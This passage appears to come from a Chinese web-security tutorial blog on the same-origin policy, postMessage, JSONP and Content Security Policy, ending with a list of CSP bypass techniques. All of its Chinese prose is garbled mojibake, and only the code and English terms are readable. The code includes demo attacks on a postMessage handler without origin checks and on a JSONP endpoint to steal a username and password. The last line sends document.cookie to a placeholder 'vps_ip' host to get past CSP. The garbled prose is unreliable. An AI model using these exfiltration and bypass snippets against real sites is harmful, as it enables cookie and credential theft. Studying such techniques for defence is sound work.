<li>å¦‚æœè®¾ç½®<code>Access-Control-Allow-Origin:*</code>ï¼Œåˆ™ä¸ç®¡æœ‰æ²¡æœ‰è®¾ç½®<code>Access-Control-Allow-Credentials:true</code>ï¼Œå¸¦Cookieçš„è¯·æ±‚éƒ½ä¼šå¤±è´¥</li>
</ul>
</li>
</ul>
<h3 id="0X02-document-domain"><a href="#0X02-document-domain" class="headerlink" title="0X02 document.domain"></a>0X02 document.domain</h3><ul>
<li>é’ˆå¯¹åŒæºç­–ç•¥çš„ç¬¬äºŒä¸ªé™åˆ¶ï¼Œä¸åŒçª—å£ä¹‹é—´çš„åŒæºé™åˆ¶</li>
<li>â–² åªé€‚ç”¨äºé¡¶çº§åŸŸåç›¸åŒå­åŸŸåä¸åŒä¹‹é—´çš„åŒæºç­–ç•¥ -&gt; ä¸åŒå­åŸŸåä¹‹é—´é»˜è®¤ä¸åŒæºï¼Œä½†æ˜¯å¯ä»¥é€šè¿‡è®¾ç½®document.domainä¸ºç›¸åŒçš„æ›´é«˜çº§åŸŸåï¼Œæ¥ä½¿ä¸åŒå­åŸŸåŒæº</li>
<li>æµ‹è¯•ä»£ç </li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">//ä¸è®¾ç½®document.domain</span><br><span class="line">----test1.www.xyz/window_name_1.php</span><br><span class="line">&lt;iframe id=&apos;iframe&apos; src=&quot;//test2.www.xtz/2.php&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">----test2.www.xyz/window_name_2.php</span><br><span class="line">&lt;h1&gt;123&lt;/h&gt;p</span><br><span class="line"></span><br><span class="line">//è®¾ç½®document.domain</span><br><span class="line">----test1.www.xyz/window_name_1.php</span><br><span class="line">&lt;iframe id=&apos;iframe&apos; src=&quot;//bbb.evoa.me/2.php&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;script&gt;document.domain = &quot;www.xyz&quot;&lt;/script&gt;</span><br><span class="line">----test1.www.xyz/window_name_2.php</span><br><span class="line">&lt;h1&gt;123&lt;/h&gt;</span><br><span class="line">&lt;script&gt;document.domain = &quot;www.xyz&quot;&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/images/sop_cors_csp/cors/document-name-alert.png" alt="document-name-alert"></p>
<ul>
<li><p>æ³¨é‡Š</p>
<ul>
<li><p>document.domainåªå¯ä»¥è¢«è®¾ç½®ä¸ºä»–çš„å½“å‰åŸŸæˆ–å…¶å½“å‰åŸŸçš„çˆ¶åŸŸ</p>
</li>
<li><p>document.domainçš„èµ‹å€¼æ“ä½œä¼šå¯¼è‡´ç«¯å£å·è¢«é‡å†™ä¸ºNULLï¼Œæ‰€ä»¥test1.<a href="http://www.xyzä»…è®¾ç½®document.domainä¸ºwww.xyzå¹¶ä¸èƒ½ä¸www.xyzè¿›è¡Œé€šä¿¡ï¼Œwww.xyzçš„é¡µé¢ä¹Ÿå¿…é¡»èµ‹å€¼ä¸€æ¬¡ä½¿åŒæ–¹ç«¯å£ç›¸åŒä»è€Œé€šè¿‡æµè§ˆå™¨çš„åŒæºæ£€æµ‹ã€‚è¿™ä¹ˆåšçš„ç›®çš„æ˜¯ï¼Œå¦‚æœå­åŸŸæœ‰XSSï¼Œé‚£ä¹ˆä»–çš„çˆ¶åŸŸéƒ½å­˜åœ¨å®‰å…¨éšæ‚£" target="_blank" rel="noopener">www.xyzä»…è®¾ç½®document.domainä¸ºwww.xyzå¹¶ä¸èƒ½ä¸www.xyzè¿›è¡Œé€šä¿¡ï¼Œwww.xyzçš„é¡µé¢ä¹Ÿå¿…é¡»èµ‹å€¼ä¸€æ¬¡ä½¿åŒæ–¹ç«¯å£ç›¸åŒä»è€Œé€šè¿‡æµè§ˆå™¨çš„åŒæºæ£€æµ‹ã€‚è¿™ä¹ˆåšçš„ç›®çš„æ˜¯ï¼Œå¦‚æœå­åŸŸæœ‰XSSï¼Œé‚£ä¹ˆä»–çš„çˆ¶åŸŸéƒ½å­˜åœ¨å®‰å…¨éšæ‚£</a></p>
</li>
<li><p>åŒä¸€çª—ä½“ä¸åŒçª—å£ä¹‹é—´ï¼ˆiframeä¸­çš„æˆ–window.openæ‰“å¼€çš„ï¼‰æ˜¯èƒ½å¤Ÿè·å–åˆ°å½¼æ­¤çš„windowå¯¹è±¡çš„ï¼Œå¦‚iframe.contentWindowå¯ä»¥è·å–iframeçš„windowå¯¹è±¡ï¼Œä½†æ˜¯ä¸åŒæºçš„æƒ…å†µä¸‹è¿™ä¸ªwindowå¯¹è±¡çš„å¤§éƒ¨åˆ†å±æ€§å’Œæ–¹æ³•æ˜¯å—é™åˆ¶çš„</p>
<p><img src="/images/sop_cors_csp/cors/document-name-cors.png" alt="document-name-cors"></p>
</li>
</ul>
</li>
<li><p>â–² å¦‚æœæŸä¸ªå­åŸŸä¸ºäº†å’Œæ ¹åŸŸé€šä¿¡ï¼Œæ ¹åŸŸè®¾ç½®äº†document.domainä¸ºæ ¹åŸŸï¼Œé‚£ä¹ˆå…¶ä»–å­åŸŸå¦‚æœæœ‰xssæ¼æ´å¯ä»¥ç›´æ¥è·¨åŒæºæ”»å‡»æ ¹åŸŸå’ŒåŒæ ·è®¾ç½®äº†document.domainçš„å…¶ä»–å­åŸŸ</p>
</li>
</ul>
<h3 id="0X03-window-name"><a href="#0X03-window-name" class="headerlink" title="0X03 window.name"></a>0X03 window.name</h3><ul>
<li>windowå¯¹è±¡æœ‰ä¸ªnameå±æ€§ï¼Œè¯¥å±æ€§æœ‰ä¸ªç‰¹å¾<ul>
<li>åœ¨ä¸€ä¸ªçª—å£(window)çš„ç”Ÿå‘½å‘¨æœŸå†…ï¼Œçª—å£è½½å…¥çš„æ‰€æœ‰çš„é¡µé¢éƒ½æ˜¯å…±äº«ä¸€ä¸ªwindow.nameçš„</li>
<li>æ¯ä¸ªé¡µé¢å¯¹window.nameéƒ½æœ‰è¯»å†™çš„æƒé™</li>
<li>window.nameæ˜¯æŒä¹…å­˜åœ¨ä¸€ä¸ªçª—å£è½½å…¥è¿‡çš„æ‰€æœ‰é¡µé¢ä¸­ï¼Œå¹¶ä¸ä¼šå› æ–°é¡µé¢çš„è½½å…¥è€Œè¿›è¡Œé‡ç½®</li>
</ul>
</li>
<li>â–² window.nameå‡ ä¹ä¸å—åŒæºç­–ç•¥çš„å½±å“</li>
<li>æµ‹è¯•ä»£ç <ul>
<li>è®¿é—®æµç¨‹ï¼šé€šè¿‡Consoleå°çš„xx.contentWindow.nameè®¿é—®iframeä¸­çš„nameå±æ€§ï¼Œæµè§ˆå™¨è¿”å›äº†è·¨åŸŸè®¿é—®æ‹’ç»ã€‚ä½†æ˜¯æˆ‘ä»¬é€šè¿‡è®¾ç½®iframeçš„srcä¸º3.php (3.phpå¯ä»¥ä¸ä¸1.phpåŒåŸŸ)ï¼Œåœ¨iframeä¸­çš„æ‰€æœ‰é¡µé¢å…±äº«window.nameï¼Œç„¶å3.phpä¸­çš„è„šæœ¬è®¿é—®åˆ°ä¸åŒæºçš„é¡µé¢2.phpå¹¶è·å–åˆ°äº†window.name</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">----test1.www.xyz/1.php</span><br><span class="line">&lt;iframe id=&apos;xx&apos; src=&quot;//test2.www.xyz/2.php&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">----test2.www.xyz/2.php</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    window.name = &quot;flag&#123;this_is_flag&#125;&quot;;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">----test1.www.xyz/3.php</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    alert(window.name);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/images/sop_cors_csp/cors/window-name-alert.png" alt="window-name-alert"></p>
<ul>
<li>æ³¨é‡Š<ul>
<li>window.nameçš„å€¼åªèƒ½æ˜¯å­—ç¬¦ä¸²çš„å½¢å¼ï¼Œè¿™ä¸ªå­—ç¬¦ä¸²çš„å¤§å°æœ€å¤§èƒ½å…è®¸2Må·¦å³ç”šè‡³æ›´å¤§çš„ä¸€ä¸ªå®¹é‡ï¼Œå…·ä½“å–å†³äºä¸åŒçš„æµè§ˆå™¨</li>
<li>â–² ä¸è¦æŠŠæ•æ„Ÿæ•°æ®å­˜åœ¨window.nameä¸­ï¼Œå¦åˆ™æ•æ„Ÿæ•°æ®å¯ä»¥è¢«ä»»ä½•å…¶ä»–ç½‘é¡µçš„JSè„šæœ¬è·å–</li>
</ul>
</li>
</ul>
<h3 id="0X04-location-hash"><a href="#0X04-location-hash" class="headerlink" title="0X04 location.hash"></a>0X04 location.hash</h3><ul>
<li>location.hashå…¶å®å°±æ˜¯URLçš„é”šéƒ¨åˆ†(ä»#å·å¼€å§‹çš„éƒ¨åˆ†)</li>
<li>åŸç†<ul>
<li>æ”¹å˜hashå¹¶ä¸ä¼šå¯¼è‡´é¡µé¢åˆ·æ–°ï¼Œæ‰€ä»¥å¯ä»¥åˆ©ç”¨hashå€¼æ¥è¿›è¡Œæ•°æ®ä¼ é€’</li>
<li>ä¸åŒåŸŸä¸‹location.hashä¹Ÿæ˜¯ä¸èƒ½ç›¸äº’è¯»å–çš„</li>
</ul>
</li>
<li>å…·ä½“åšæ³•<ul>
<li>AåŸŸçš„é¡µé¢aåŠ è½½ä¸€ä¸ªiframeï¼Œè®¾ç½®iframeçš„srcä¸ºBåŸŸçš„bé¡µé¢+#ä¼ è¾“ç»™bçš„æ•°æ®</li>
<li>æ­¤æ—¶bé¡µé¢çš„jsè„šæœ¬å¯ä»¥é€šè¿‡è¯»å–location.hashè·å¾—é¡µé¢aä¼ è¿‡æ¥çš„æ•°æ®ï¼Œç„¶ååœ¨bé¡µé¢å†ç”Ÿæˆä¸€ä¸ªiframeï¼ŒsrcæŒ‡å‘AåŸŸçš„é¡µé¢c+#ä¼ è¾“ç»™açš„æ•°æ®</li>
<li>ç”±äºé¡µé¢cä¸é¡µé¢aåŒåŸŸåŒæºï¼Œæ‰€ä»¥é¡µé¢cçš„è„šæœ¬å¯ä»¥ä¿®æ”¹açš„locaition.hash</li>
</ul>
</li>
</ul>
<h3 id="0X05-PostMessage"><a href="#0X05-PostMessage" class="headerlink" title="0X05 PostMessage"></a>0X05 PostMessage</h3><ul>
<li>â–² window.postMessage()æ–¹æ³•å¯ä»¥å®‰å…¨åœ°å®ç°è·¨æºé€šä¿¡</li>
<li>å½“è¢«è°ƒç”¨æ—¶ï¼Œä¼šåœ¨æ‰€æœ‰é¡µé¢è„šæœ¬æ‰§è¡Œå®Œæ¯•ä¹‹åå‘ç›®æ ‡çª—å£æ´¾å‘ä¸€ä¸ªMessageEventæ¶ˆæ¯å‡½æ•°<ul>
<li>ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºå‘é€çš„æ¶ˆæ¯</li>
<li>ç¬¬äºŒä¸ªå‚æ•°æ˜¯åŒ¹é…å‘é€ç»™çš„çª—å£çš„urlåœ°ï¼ˆå¯ä»¥ä½¿ç”¨*ï¼Œä»£è¡¨æ— é™åˆ¶é€šé…ï¼‰ï¼Œè‹¥ç›®æ ‡urlå’Œæ­¤å‚æ•°ä¸åŒ¹é…ï¼Œæ¶ˆæ¯å°±ä¸ä¼šè¢«å‘é€</li>
</ul>
</li>
<li>è¢«æ¥å—çª—å£åˆ™å¯ä»¥é€šè¿‡ç›‘å¬messageäº‹ä»¶æ¥è·å–æ¥å—ä¿¡æ¯</li>
<li>æµ‹è¯•ä»£ç </li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">----test1.www.xyz/1.php</span><br><span class="line">&lt;iframe id=&apos;iframe&apos; src=&quot;//test2.www.xyz/2.php&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    window.addEventListener(&apos;message&apos;,function(e)&#123;</span><br><span class="line">        alert(e.data);</span><br><span class="line">    &#125;)</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">----test2.www.xyz/2.php</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    parent.postMessage(&apos;test&apos;,&apos;*&apos;);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/images/sop_cors_csp/cors/postmessage-example.png" alt="postmessage-example"></p>
<ul>
<li>æ¶æ„ä»£ç æµ‹è¯•ï¼ˆäº‹ä»¶ç›‘å¬æ²¡æœ‰åˆ¤æ–­äº‹ä»¶çš„æ¥æºï¼‰</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">----test1.www.xyz/1.php</span><br><span class="line">&lt;?php</span><br><span class="line">setcookie(&apos;flag&apos;,&apos;flag&#123;this_is_flag&#125;&apos;);</span><br><span class="line">?&gt;</span><br><span class="line">&lt;iframe id=&apos;iframe&apos; src=&quot;//test2.www.xyz/2.php&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;h1 id=&quot;name&quot;&gt;&lt;/h1&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    window.addEventListener(&apos;message&apos;,function(e)&#123;</span><br><span class="line">        document.getElementById(&apos;name&apos;).innerHTML = e.data</span><br><span class="line">        &#125;)</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">----test2.www.xyz/evil.php</span><br><span class="line">&lt;iframe id=&quot;iframe&quot; src=&quot;//test1.www.xyz/1.php&quot;&gt;&lt;/iframe&gt;</span><br><span class="line"></span><br><span class="line">//æ­£åˆ™è¿‡æ»¤çš„1.php</span><br><span class="line">&lt;?php</span><br><span class="line">setcookie(&quot;flag&quot;,&quot;flag&#123;this_is_flag&#125;&quot;);</span><br><span class="line">?&gt;</span><br><span class="line">&lt;iframe id=&apos;iframe&apos; src=&quot;//test2.www.xyz/2.php&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;h1 id=&quot;name&quot;&gt;&lt;/h1&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    window.addEventListener(&apos;message&apos;,function(e)&#123;</span><br><span class="line">        if(/^http:\/\/.*www\.xyz$/.test(e.origin))</span><br><span class="line">        document.getElementById(&apos;name&apos;).innerHTML = e.data;</span><br><span class="line">    &#125;)</span><br><span class="line">&lt;/script&gt;   --------------&gt; ç»•è¿‡æ–¹æ³•ï¼šéœ€è¦ä¸€ä¸ªå­˜åœ¨åç¼€ä¸ºwww.xyzçš„åŸŸåå³å¯</span><br></pre></td></tr></table></figure>

<p><img src="/images/sop_cors_csp/cors/postmessage-alert.png" alt="postmessage-alert"></p>
<h3 id="0X06-JSONP"><a href="#0X06-JSONP" class="headerlink" title="0X06 JSONP"></a>0X06 JSONP</h3><ul>
<li><code>&lt;script&gt;</code>æ ‡ç­¾å¯ä»¥è·¨åŸŸåŠ è½½èµ„æºï¼Œä½†æ˜¯è¿”å›å†…å®¹å¦‚æœä¸ç¬¦åˆJSè¯­æ³•åŒæ ·æ— æ³•è·å–æ•°æ®ï¼ŒJSONPåˆ™æ˜¯é€šè¿‡è¿”å›ç¬¦åˆJSè¯­æ³•çš„æ•°æ®å†…å®¹ä½¿èµ„æºèƒ½å¤Ÿè·¨åŸŸåŠ è½½</li>
<li>æµ‹è¯•ä»£ç </li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">----test1.www.xyz/1.php</span><br><span class="line">&lt;script&gt;</span><br><span class="line">function echoData(data)&#123;</span><br><span class="line">    console.log(&quot;DATA:&quot;,data);</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;script src=&quot;//test2.www.xyz/2.php?func=echoData&quot;&gt;&lt;/script&gt;</span><br><span class="line">----test2.www.xyz/2.php</span><br><span class="line">&lt;?php</span><br><span class="line">    header(&apos;Content-type: application/javascript&apos;);</span><br><span class="line">    $func = $_REQUEST[&apos;func&apos;]??&quot;func&quot;;</span><br><span class="line">    $data = &apos;[&quot;aaa&quot;,&quot;bbb&quot;,&quot;ccc&quot;,&quot;ddd&quot;]&apos;;</span><br><span class="line">    echo $func.&quot;(&quot;.$data.&quot;)&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/images/sop_cors_csp/cors/jsonp-example.png" alt="jsonp-example"></p>
<ul>
<li>è¿è¡Œè¿‡ç¨‹ï¼š1.phpé¡µé¢å…ˆè®¾å®šå¥½è¾“å‡ºæ•°æ®çš„å‡½æ•°ï¼Œé€šè¿‡<code>&lt;script&gt;</code>æ ‡ç­¾è¯·æ±‚2.phpå¹¶å¸¦æœ‰å‡½æ•°åå‚æ•°ï¼Œ2.phpæŠŠæ•°æ®å½“å‡½æ•°å‚æ•°ä¼ å…¥å¹¶æ ¹æ®å‡½æ•°åè¾“å‡ºå¯¹åº”å‡½æ•°è°ƒç”¨è¯­å¥ï¼Œ1.phpè·å¾—å“åº”åè‡ªåŠ¨è°ƒç”¨å‡½æ•°å³å¯è·å–æ•°æ®</li>
<li>ä¸å­˜åœ¨ä»»ä½•éªŒè¯çš„JSONPæ¥å£</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">----test2.www.xyz/evail.php</span><br><span class="line">&lt;script&gt;</span><br><span class="line">function echoData(data)&#123;</span><br><span class="line">    alert(&quot;usernameï¼š&quot;+data.username+&quot;passwordï¼š&quot;+data.password);</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;script src=&quot;//test1.www.xyz/1.php?func=echoData&quot;&gt;&lt;/script&gt;</span><br><span class="line">----test1.www.xyz/1.php</span><br><span class="line">&lt;?php</span><br><span class="line">    header(&apos;Content-type: application/javascript&apos;);</span><br><span class="line">    $func = $_REQUEST[&apos;func&apos;]??&quot;func&quot;;</span><br><span class="line">    $data = &quot;&#123;&apos;username&apos;:&apos;test1&apos;,&apos;password&apos;:&apos;test1&apos;&#125;&quot;;</span><br><span class="line">    echo $func.&quot;(&quot;.$data.&quot;)&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/images/sop_cors_csp/cors/jsonp-username-password.jpg" alt="jsonp-username-password"></p>
<ul>
<li>â–² æœªè®¾ç½®Conten-typeå¯ä»¥å¯¼è‡´åå°„æ€§XSS<ul>
<li>ä½†æ˜¯å°±ç®—è®¾ç½®å¥½äº†Conten-typeä¹Ÿå¯èƒ½ä¼šæœ‰å®‰å…¨éšæ‚£</li>
</ul>
</li>
<li>â–² è¿™ç§ç”¨æˆ·å®Œå…¨å¯æ§ç‚¹å¯ä»¥ç»“åˆå¾ˆå¤šå…¶ä»–ç¼ºé™·äº§ç”Ÿæ¼æ´ï¼Œæ‰€ä»¥è¿™ç§æ¥å£è¿˜åº”è¯¥è¿‡æ»¤éæ³•å­—ç¬¦</li>
<li>é˜²å¾¡æ–¹æ³•<ul>
<li>éªŒè¯refererï¼Œå¾ˆå¤šæ¥å£éªŒè¯refererçš„æ­£åˆ™æœ‰è¯¯ï¼Œå¯ä»¥é€šè¿‡ç»•è¿‡æ­£åˆ™ç»§ç»­æ”»å‡»</li>
<li>éªŒè¯token</li>
</ul>
</li>
</ul>
<h2 id="å†…å®¹å®‰å…¨ç­–ç•¥"><a href="#å†…å®¹å®‰å…¨ç­–ç•¥" class="headerlink" title="å†…å®¹å®‰å…¨ç­–ç•¥"></a>å†…å®¹å®‰å…¨ç­–ç•¥</h2><blockquote>
<p>   CSP, Content Security Policy</p>
</blockquote>
<ul>
<li>å®˜æ–¹è§£é‡Š<ul>
<li>ä¸€ä¸ªé™„åŠ çš„å®‰å…¨å±‚ï¼Œç”¨äºå¸®åŠ©æ£€æµ‹å’Œç¼“è§£æŸäº›ç±»å‹çš„æ”»å‡»ï¼ŒåŒ…æ‹¬è·¨ç«™è„šæœ¬(XSS)å’Œæ•°æ®æ³¨å…¥ç­‰æ”»å‡»ã€‚è¿™äº›æ”»å‡»å¯ç”¨äºå®ç°ä»æ•°æ®çªƒå–åˆ°ç½‘ç«™ç ´åæˆ–ä½œä¸ºæ¶æ„è½¯ä»¶åˆ†å‘ç‰ˆæœ¬ç­‰ç”¨é€”</li>
</ul>
</li>
<li>é€šä¿—ç†è§£<ul>
<li>å¼€å‘è€…æ˜ç¡®å‘Šè¯‰å®¢æˆ·ç«¯ï¼ˆåˆ¶å®šæ¯”è¾ƒä¸¥æ ¼çš„ç­–ç•¥å’Œè§„åˆ™ï¼‰ï¼Œå“ªäº›å¤–éƒ¨èµ„æºæ˜¯å¯ä»¥åŠ è½½å’Œæ‰§è¡Œçš„</li>
</ul>
</li>
<li>æ¦‚å¿µç†è§£<ul>
<li>CSPå°±æ˜¯ä¸€ä¸ªç»Ÿä¸€æœ‰æ•ˆçš„é˜²æ­¢ç½‘ç«™å—åˆ°XSSæ”»å‡»çš„é˜²å¾¡æ–¹æ³•</li>
<li>CSPæ˜¯ä¸€ç§ç™½åå•ç­–ç•¥</li>
</ul>
</li>
</ul>
<h5 id="å¯ç”¨CSP"><a href="#å¯ç”¨CSP" class="headerlink" title="å¯ç”¨CSP"></a>å¯ç”¨CSP</h5><ul>
<li>é€šè¿‡HTTPå¤´ä¿¡æ¯çš„Content-Security-Policyçš„å­—æ®µï¼ˆé…ç½®æ–‡ä»¶æˆ–è€…åç«¯è®¾ç½®ï¼‰</li>
<li>é€šè¿‡ç½‘é¡µçš„<code>&lt;meta&gt;</code>æ ‡ç­¾<ul>
<li><code>&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;script-src &#39;self&#39;&quot;&gt;</code></li>
</ul>
</li>
<li>ä¿®æ”¹çš„é™åˆ¶<ul>
<li><code>&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;script-src &#39;self&#39; https://cdn.xxx.com&quot;&gt;</code>  -&gt; contentæ·»åŠ ç™½åå• -&gt; å³å¯ä»¥<code>script</code>æ ‡ç­¾å¼•å…¥cdb</li>
</ul>
</li>
</ul>
<h5 id="å¸¸ç”¨"><a href="#å¸¸ç”¨" class="headerlink" title="å¸¸ç”¨"></a>å¸¸ç”¨</h5><ul>
<li>script-src: å®šä¹‰äº†é¡µé¢ä¸­Javascriptçš„æœ‰æ•ˆæ¥æº</li>
<li>style-srcï¼šå®šä¹‰äº†é¡µé¢ä¸­CSSæ ·å¼çš„æœ‰æ•ˆæ¥æº</li>
<li>img-src: å®šä¹‰äº†é¡µé¢ä¸­å›¾ç‰‡å’Œå›¾æ ‡çš„æœ‰æ•ˆæ¥æº</li>
<li>font-src: å®šä¹‰äº†å­—ä½“åŠ è½½çš„æœ‰æ•ˆæ¥æº</li>
<li>media-src: ç”¨äºé™åˆ¶å…è®¸ä¼ è¾“è§†é¢‘å’ŒéŸ³é¢‘çš„æ¥æºã€‚</li>
<li>object-src: å¯å¯¹ Flash å’Œå…¶ä»–æ’ä»¶è¿›è¡Œæ§åˆ¶ã€‚</li>
<li>plugin-types: ç”¨äºé™åˆ¶é¡µé¢å¯ä»¥è°ƒç”¨çš„æ’ä»¶ç§ç±»ã€‚</li>
<li>child-src: å®šä¹‰äº†web workersä»¥åŠåµŒå¥—çš„æµè§ˆä¸Šä¸‹æ–‡ï¼ˆå¦‚<code>&lt;frame&gt;å’Œ&lt;iframe&gt;</code>ï¼‰çš„æº</li>
<li>content-src: å®šä¹‰äº†è¯·æ±‚ã€XMLHttpRequestã€WebSocket å’Œ EventSource çš„è¿æ¥æ¥æº</li>
<li>â–² default-src: è‡ªå®šä¹‰é»˜è®¤å½¢å¼<ul>
<li>å¦‚æœåŒæ—¶è®¾ç½®æŸä¸ªå•é¡¹é™åˆ¶ï¼ˆæ¯”å¦‚font-srcï¼‰å’Œdefault-srcï¼Œå‰è€…ä¼šè¦†ç›–åè€…ï¼Œå³å­—ä½“æ–‡ä»¶ä¼šé‡‡ç”¨font-srcçš„å€¼ï¼Œå…¶ä»–èµ„æºä¾ç„¶é‡‡ç”¨default-srcçš„å€¼</li>
</ul>
</li>
</ul>
<h5 id="å…³é”®å­—"><a href="#å…³é”®å­—" class="headerlink" title="å…³é”®å­—"></a>å…³é”®å­—</h5><ul>
<li>â€˜noneâ€™ -&gt; img-src â€˜noneâ€™<ul>
<li>ä¸å…è®¸ä»»ä½•å†…å®¹</li>
</ul>
</li>
<li>â€˜selfâ€™ -&gt; img-src â€˜selfâ€™<ul>
<li>ä»£è¡¨å’Œæ–‡æ¡£åŒæºï¼ŒåŒ…æ‹¬ç›¸åŒçš„URLåè®®å’Œç«¯å£å·ã€‚ä¸¤ä¾§å•å¼•å·æ˜¯å¿…é¡»çš„ã€‚</li>
</ul>
</li>
<li>â€˜unsafe-inlineâ€™ -&gt; script-src â€˜unsafe-inlineâ€™<ul>
<li>å…è®¸åŠ è½½inlineèµ„æºï¼ˆä¾‹å¦‚å¸¸è§çš„styleå±æ€§ï¼Œonclickï¼Œinline jså’Œinline cssç­‰ç­‰ï¼‰</li>
</ul>
</li>
<li>â€˜unsafe-evalâ€™ -&gt; script-src â€˜unsafe-evalâ€™<ul>
<li>å…è®¸åŠ è½½åŠ¨æ€jsä»£ç ï¼Œä¾‹å¦‚eval()</li>
</ul>
</li>
<li>data: -&gt; img-src data:<ul>
<li>å…è®¸æ¥è‡ªç›¸åŒæ¥æºçš„å†…å®¹ï¼ˆç›¸åŒçš„åè®®ã€åŸŸåå’Œç«¯å£ï¼‰</li>
</ul>
</li>
<li>æ³¨è§£<ul>
<li>å¦‚æœä¸ç‰¹åˆ«æŒ‡å®š<code>&#39;unsafe-inline&#39;</code>æ—¶ï¼Œé¡µé¢ä¸Šæ‰€æœ‰inlineæ ·å¼å’Œè„šæœ¬éƒ½ä¸ä¼šæ‰§è¡Œ</li>
<li>ä¸ç‰¹åˆ«æŒ‡å®š<code>&#39;unsafe-eval&#39;</code>ï¼Œé¡µé¢ä¸Šä¸å…è®¸ä½¿ç”¨new Functionï¼ŒsetTimeoutï¼Œevalç­‰æ–¹å¼æ‰§è¡ŒåŠ¨æ€ä»£ç </li>
</ul>
</li>
</ul>
<h5 id="æ”¶é›†ä¸åŒ¹é…è§„åˆ™çš„æ—¥å¿—"><a href="#æ”¶é›†ä¸åŒ¹é…è§„åˆ™çš„æ—¥å¿—" class="headerlink" title="æ”¶é›†ä¸åŒ¹é…è§„åˆ™çš„æ—¥å¿—"></a>æ”¶é›†ä¸åŒ¹é…è§„åˆ™çš„æ—¥å¿—</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">//å‘ç”Ÿçš„CSPå¤´</span><br><span class="line">Content-Security-Policy-Report-Only: script-src &apos;self&apos;; report-uri http://test/</span><br><span class="line"></span><br><span class="line">//è¿™æ ·ï¼Œå¦‚æœé¡µé¢ä¸Šæœ‰inline JSï¼Œä¾ç„¶ä¼šæ‰§è¡Œï¼Œåªæ˜¯æµè§ˆå™¨ä¼šå‘æŒ‡å®šåœ°å€å‘é€ä¸€ä¸ªPOSTè¯·æ±‚ï¼ŒåŒ…å«è¿™æ ·çš„ä¿¡æ¯</span><br><span class="line">&#123;&quot;csp-report&quot;:&#123;&quot;document-uri&quot;:&quot;http://test/test.php&quot;,&quot;referrer&quot;:&quot;&quot;,&quot;violated-directive&quot;:&quot;script-src &apos;self&apos;&quot;,&quot;original-policy&quot;:&quot;script-src &apos;self&apos;; report-uri http://test/&quot;,&quot;blocked-uri&quot;:&quot;&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>

<h3 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h3><ul>
<li><a href="https://developer.mozilla.org/zh-CN/docs/Web/Security/CSP" target="_blank" rel="noopener">å†…å®¹å®‰å…¨ç­–ç•¥ (CSP)</a></li>
</ul>
<h2 id="å†…å®¹å®‰å…¨ç­–ç•¥çš„ç»•è¿‡"><a href="#å†…å®¹å®‰å…¨ç­–ç•¥çš„ç»•è¿‡" class="headerlink" title="å†…å®¹å®‰å…¨ç­–ç•¥çš„ç»•è¿‡"></a>å†…å®¹å®‰å…¨ç­–ç•¥çš„ç»•è¿‡</h2><ul>
<li>location.href</li>
<li>linkæ ‡ç­¾å¯¼è‡´çš„ç»•è¿‡</li>
<li>ä½¿ç”¨iframeç»•è¿‡</li>
<li>ç”¨CDNç»•è¿‡</li>
<li>ç«™ç‚¹å¯æ§é™æ€èµ„æºç»•è¿‡</li>
<li>ç«™ç‚¹å¯æ§JSONPç»•è¿‡</li>
<li>Base-uriç»•è¿‡</li>
<li>ä¸å®Œæ•´scriptç»•è¿‡nonce</li>
<li>object-srcç»•è¿‡ï¼ˆPDFXSSï¼‰ -&gt; æš‚æ— å­¦</li>
<li>SVGç»•è¿‡</li>
<li>ä¸å®Œæ•´çš„èµ„æºæ ‡ç­¾è·å–èµ„æº</li>
<li>CSSé€‰æ‹©å™¨è·å–å†…å®¹  -&gt;  æš‚æ— å­¦</li>
<li>CRLFç»•è¿‡</li>
</ul>
<h3 id="0X00-location-href"><a href="#0X00-location-href" class="headerlink" title="0X00 location.href"></a>0X00 location.href</h3><ul>
<li>CSPä¸å½±å“location.hrefè·³è½¬</li>
<li>åˆ©ç”¨æ¡ä»¶<ul>
<li>å¯ä»¥æ‰§è¡Œä»»æ„JSè„šæœ¬ï¼Œä½†æ˜¯ç”±äºå—åˆ°CSPå½±å“æ— æ³•å¤–å¸¦æ•°æ®</li>
</ul>
</li>
<li>å°†cookieæ‰“åˆ°ä¸ªäººvpsä¸Š<ul>
<li><code>location.href = &quot;vps_ip:xxxx?+document.cookie</code></li>
</ul>
</li>
</ul>
